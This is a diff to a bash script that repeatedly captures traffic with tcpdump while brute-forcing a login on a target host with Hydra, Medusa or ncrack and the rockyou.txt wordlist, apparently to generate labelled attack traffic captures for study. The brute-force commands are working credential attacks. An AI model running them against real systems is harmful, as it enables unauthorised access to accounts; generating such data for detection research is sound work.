@@ -12,27 +12,49 @@ FOR THE FAILED ATTEMPTS:
 SRC_IP=$1
 DST_IP=$2
 DST_PORT=$3
-HYDRA_PROT=$4
+PROT=$4
 ITERATIONS=$5
 LENGTH=$6
 UNAME=$7
 OS=$8
 
+echo -n "What should I use? Hydra, Medusa or ncrack (caps matter): "
+read WHICH
+
+WORKDIR=Failed_${OS}_$(date +%H%M%S)
+mkdir $WORKDIR
+
 for i in $(seq 1 $ITERATIONS)
         do
                 echo "---------- start tcpdump #$i ------------"
-                sudo tcpdump -i eth0 host $SRC_IP and host $DST_IP -w Hydra_${HYDRA_PROT}_${OS}_${i}_$(date +"%T" | sed -e "s/:/-/g").pcap & ttempid=$!
+                sudo tcpdump -i eth0 host $SRC_IP and host $DST_IP -w $WORKDIR/${WHICH}_${PROT}_${OS}_${i}_$(date +"%T" | sed -e "s/:/-/g").pcap & ttempid=$!
                 echo "********** tcpdump PID $ttempid ********"
-                echo "---------  start hydra #$i -------------"
-                hydra -f -l $UNAME -P /usr/share/wordlists/rockyou.txt -u  -s $DST_PORT $DST_IP $HYDRA_PROT -I & htempid=$!
-                echo "********* hygra PID $htempid ***********"
-                sleep $LENGTH
-                hgid=$(ps xao pid,pgid,comm | grep ${htempid} | awk '{ print $2 }')
-                echo "****** HGID $hgid"
-                sudo pkill -TERM -P ${hgid}
-                sleep 5
-                sudo pkill -TERM -P ${ttempid}
-        done
+                case $WHICH in
+                        "Hydra")
+                                echo "---------  start hydra #$i -------------"
+                                hydra -l $UNAME -P /usr/share/wordlists/rockyou.txt -s $DST_PORT $DST_IP $PROT -I & htempid=$!
+                                echo "********* hydra PID $htempid ***********"
+                                ;;
+                        "Medusa")
+                                echo "---------  start medusa #$i -------------"
+                                medusa -h $DST_IP -u $UNAME -P /usr/share/wordlists/rockyou.txt -M $PROT -n $DST_PORT -f & htempid=$!
+                                echo "********* medusa PID $htempid ***********"
+                                ;;                                                                                                                                                                                                         
+                        "ncrack")                                                                                                                                                                                                          
+                                echo "---------  start ncrack #$i -------------"                                                                                                                                                           
+                                ncrack $PROT://$DST_IP:$DST_PORT --user $UNAME -P /usr/share/wordlists/rockyou.txt -f -v & htempid=$!                                                                                                      
+                                echo "********* ncrack PID $htempid ***********"                                                                                                                                                           
+                                ;;                                                                                                                                                                                                         
+                        *)                                                                                                                                                                                                                 
+                                echo "Invalid Choice. Press Ctrl+C and start again!"                                                                                                                                                       
+                esac                                                                                                                                                                                                                       
+                sleep $LENGTH                                                                                                                                                                                                              
+                hgid=$(ps xao pid,pgid,comm | grep ${htempid} | awk '{ print $2 }')                                                                                                                                                        
+                echo "****** HGID $hgid"                                                                                                                                                                                                   
+                sudo pkill -TERM -P ${hgid}                                                                                                                                                                                                
+                sleep 5                                                                                                                                                                                                                    
+                sudo pkill -TERM -P ${ttempid}                                                                                                                                                                                             
+        done                                                                                         
 
 
 ############################
